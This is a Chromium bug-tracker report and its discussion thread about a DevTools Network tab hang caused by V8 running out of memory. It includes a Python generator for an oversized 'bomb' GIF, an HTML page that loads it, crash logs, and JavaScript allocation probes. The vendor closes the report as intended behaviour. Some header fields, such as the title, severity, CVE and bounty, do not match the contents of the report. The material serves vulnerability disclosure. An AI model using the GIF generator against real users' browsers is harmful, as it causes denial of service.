# use-after-poison on address  thread T0

| Field | Value |
|-------|-------|
| **Issue ID** | [421003100](https://issues.chromium.org/issues/421003100) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Speed>Tracing |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **CVE IDs** | CVE-2025-5419 |
| **Reporter** | mu...@gmail.com |
| **Assignee** | et...@chromium.org |
| **Created** | 2025-05-28 |
| **Bounty** | $2,000.00 |

## Description

---

### Report description

V8 JavaScript OOM (invalid array length) when rendering GIF response in Network tab DevTools

---

### Bug location

#### Where do you want to report your vulnerability?

Chrome VRP – Report security issues affecting the Chrome browser. [See program rules](https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules)

---

### The problem

#### Please describe the technical details of the vulnerability

## Description

When opening a very large GIF file in the Response tab of the Chromium DevTools Network panel, a memory failure occurs in the V8 JavaScript engine with an "invalid array length" error message. This causes the Network tab to become unresponsive (hang) or crash, even though the main browser process continues to run.

The issue occurs when DevTools attempts to parse and render the full GIF response content in text or preview form, which results in an invalid array allocation and out-of-memory (OOM) in V8.

## Steps to reproduce

- Create a gif with this python

```
def create_interlaced_fragmented_gif(
    filename, width, height, frame_count, zero_frame_every=5
):
    def to_bytes(val, length=2):
        return val.to_bytes(length, "little")

    def make_header():
        return b"GIF89a"

    def make_lsd(w, h):
        # Logical Screen Descriptor: GCT flag set, size = 256 colors
        return to_bytes(w) + to_bytes(h) + b"\xF7\x00\x00"

    def make_gct():
        # 256-color Global Color Table
        base_colors = [
            b"\x00\x00\x00",  # Black
            b"\xFF\x00\x00",  # Red
            b"\x00\xFF\x00",  # Green
            b"\x00\x00\xFF",  # Blue
            b"\xFF\xFF\xFF",  # White
        ]
        gct = b"".join(base_colors)
        gct += b"\x00\x00\x00" * (256 - len(base_colors))
        return gct

    def make_app_ext():
        # NETSCAPE2.0 loop extension
        return b"\x21\xFF\x0B" + b"NETSCAPE2.0" + b"\x03\x01\x00\x00\x00"

    def make_gce():
        return b"\x21\xF9\x04\x00\x00\x00\x00\x00"

    def make_img_desc(w, h, interlaced=False):
        packed = 0x40 if interlaced else 0x00
        return (
            b"\x2C" + b"\x00\x00\x00\x00" + to_bytes(w) + to_bytes(h) + bytes([packed])
        )

    def make_fragmented_lzw_block(subblock_count=1000, payload_size=255):
        """
        Generate LZW data split into many small sub-blocks (255 bytes max),
        followed by terminator block.
        """
        subblocks = bytearray()
        subblocks += b"\x02"  # LZW min code size

        chunk = b"\xFF" * payload_size
        for _ in range(subblock_count):
            subblocks.append(len(chunk))
            subblocks += chunk

        subblocks.append(0x00)  # End of LZW data
        return bytes(subblocks)

    def trailer():
        return b"\x3B"

    gif = bytearray()
    gif += make_header()
    gif += make_lsd(width, height)
    gif += make_gct()
    gif += make_app_ext()

    for i in range(frame_count):
        gif += make_gce()

        if (i + 1) % zero_frame_every == 0:
            # Oversized + interlaced + fragmented LZW
            gif += make_img_desc(5000, 5000, interlaced=True)
            gif += make_fragmented_lzw_block(subblock_count=4096, payload_size=255)
        else:
            gif += make_img_desc(width, height, interlaced=True)
            gif += make_fragmented_lzw_block(subblock_count=0, payload_size=0)

    gif += trailer()

    with open(filename, "wb") as f:
        f.write(gif)

    print(
        f"[✓] GIF '{filename}' dibuat: {frame_count} frame ( tiap {zero_frame_every} frame, fragmented LZW)"
    )


# 🧪 Contoh penggunaan:
create_interlaced_fragmented_gif(
    filename="interlaced_lzw_frag_bomb.gif",
    width=5000,
    height=5000,
    frame_count=100,
    zero_frame_every=2,
)

```

- Create an index.html

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>GIF Stress Test</title>
    <style>
        body {
            margin: 0;
            background-color: #111;
            color: white;
            font-family: sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }
        h1 {
            margin-bottom: 20px;
        }
        footer {
            margin-top: 20px;
            opacity: 0.8;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <h1>Chrome Android GIF Stress Test</h1>

    <div class="gif-container">
        <img src="interlaced_lzw_frag_bomb.gif" alt="GIF 1">
    </div>
    <footer>
        Tes ini memuat 3 GIF besar sekaligus. Perhatikan performa, lag, atau crash di browser.
    </footer>
</body>
</html>

```

- Open the index html with Chromium browser
- Open the devtools -> network tab
- Click gif file and click response.
- Devtools hang, and OOM.

```
<--- Last few GCs --->

[1:0x239400404000]   148129 ms: Scavenge (during sweeping) 292.8 (325.7) -> 260.8 (325.7) MB, pooled: 0.0 MB, 0.15 / 0.00 ms (average mu = 0.971, current mu = 0.967) allocation failure; 
[1:0x239400404000]   148260 ms: Scavenge (during sweeping) 292.8 (325.7) -> 260.8 (325.7) MB, pooled: 0.0 MB, 0.23 / 0.00 ms (average mu = 0.971, current mu = 0.967) allocation failure; 

[80152:1:0529/062125.714571:ERROR:third_party/blink/renderer/bindings/core/v8/v8_initializer.cc:826] V8 javascript OOM (invalid array length).
[0529/062125.723450:ERROR:third_party/crashpad/crashpad/util/linux/ptracer.cc:605] ptrace: Input/output error (5)
[0529/062125.730692:ERROR:third_party/crashpad/crashpad/util/linux/ptracer.cc:605] ptrace: Input/output error (5)
[0529/062125.731600:ERROR:third_party/crashpad/crashpad/util/linux/ptracer.cc:605] ptrace: Input/output error (5)
[0529/062125.731997:ERROR:third_party/crashpad/crashpad/util/linux/ptracer.cc:605] ptrace: Input/output error (5)
[0529/062125.930210:ERROR:third_party/crashpad/crashpad/snapshot/elf/elf_dynamic_array_reader.h:64] tag not found

```
#### Impact analysis – Please briefly explain who can exploit the vulnerability, and what they gain when doing so

[80152:1:0529/062125.714571:ERROR:third\_party/blink/renderer/bindings/core/v8/v8\_initializer.cc:826] V8 javascript OOM (invalid array length).

---

### The cause

#### What version of Chrome have you found the security issue in?

Chromium 137.0.7151.55 snap

#### Is the security issue related to a crash?

Yes, it is related to a crash.

#### Choose the type of vulnerability

Denial of Service (DoS)

## Attachments

- [2025-05-29 05-59-37.zip](attachments/2025-05-29 05-59-37.zip) (application/zip, 15.1 MB)
- 2025-06-03 01-48-01.mkv (video/x-matroska, 26.9 MB)

## Timeline

### ch...@google.com (2025-05-30)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2025-05-30)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### mu...@gmail.com (2025-05-30)

Sorry, maybe it's because of the OS or whatever. 

I can't open the chrome stable/canary in my OS.

When I have installed chrome via Debian package in Ubuntu 24, I can't open the chrome with terminal, dekstop, or menu.

Then, I want to say thank you, for Google Security Analysts that has reviewed my report.

### cf...@google.com (2025-06-02)

I think the minimal reproduce would just be the following JavaScript code:

```
const str = "a".repeat(2 ** 29 - 24);
const ary = Uint8Array.from(str);

```

This is known to us, we have a couple of places where we don't handle these OOMs gracefully (because there is no easy way to recover / handle those).  

Therefore I will close this as WAI.

### cf...@google.com (2025-06-02)

See the discussion on <https://crbug.com/40055633>

### mu...@gmail.com (2025-06-02)

1. Search failed

```
(async () => {
  let low = 1 << 20;       // mulai dari 1MB
  let high = 1 << 30;      // sampai 1GB
  let lastGood = 0;

  while (low <= high) {
    let mid = Math.floor((low + high) / 2);
    try {
      const str = "a".repeat(mid);
      const ary = Uint8Array.from(str);

      console.log("Success at size:", mid);
      lastGood = mid;
      low = mid + 1;

      await new Promise(r => setTimeout(r, 50));

    } catch (e) {
      console.warn("Failed at size:", mid);
      high = mid - 1;
    }
  }

  console.log("Maximum successful allocation:", lastGood);
})();

```

2. SIGIL/OOM occurs before at failed, between 40000000 - 50000000.

```
(async () => {
  const start = 10_000_000; // mulai dari 10 juta bytes (~10MB)
  const step = 10_000_000;  // increment 10 juta bytes tiap percobaan
  const maxTry = 60;         // maksimal 60 kali coba (sampai ~600MB)
  let lastSuccess = 0;
  let errorAt = 0;

  for (let i = 1; i <= maxTry; i++) {
    const size = start * i;
    try {
      console.log(`Try #${i}: Allocating ${size} bytes...`);
      const str = "a".repeat(size);
      const ary = Uint8Array.from(str);
      console.log(`Success at size: ${size}`);
      lastSuccess = size;
      await new Promise(r => setTimeout(r, 1000));
    } catch (e) {
      console.error(`Failed at size: ${size}`, e);
      errorAt = size;
      break;
    }
  }

  console.log("===== RESULT =====");
  console.log("Maximum successful allocation:", lastSuccess);
  if (errorAt) {
    console.log("Failed allocation at size:", errorAt);
  } else {
    console.log("No failures detected within tested range.");
  }
})();

```

### mu...@gmail.com (2025-06-02)

redacted

### mu...@gmail.com (2025-06-02)

Please, let me know. if my comments don't give any information. or you still want to close this behavior as a won't fix or still Not Applicable.

I am waiting for your response.

Thanks,

Best regards,
Muhamad Rizki Arif Fadillah

### cf...@google.com (2025-06-02)

Thanks for the other messages.  

Yes, we will still keep this as WontFix/Intended Behavior.

### mu...@gmail.com (2025-06-07)

Is The CVE-2025-5419 same root cause with my bug?

### ch...@google.com (2025-09-09)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

### mu...@gmail.com (2026-01-15)

After analyzing the issue on Windows, it appears to be the same root cause as in [475613896](https://issues.chromium.org/issues/475613896). However, the impact differs between Linux and Windows. Would it make sense to consolidate this report into [475613896](https://issues.chromium.org/issues/475613896)?

### om...@chromium.org (2026-01-15)

I would leave this issue as is.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/421003100)*
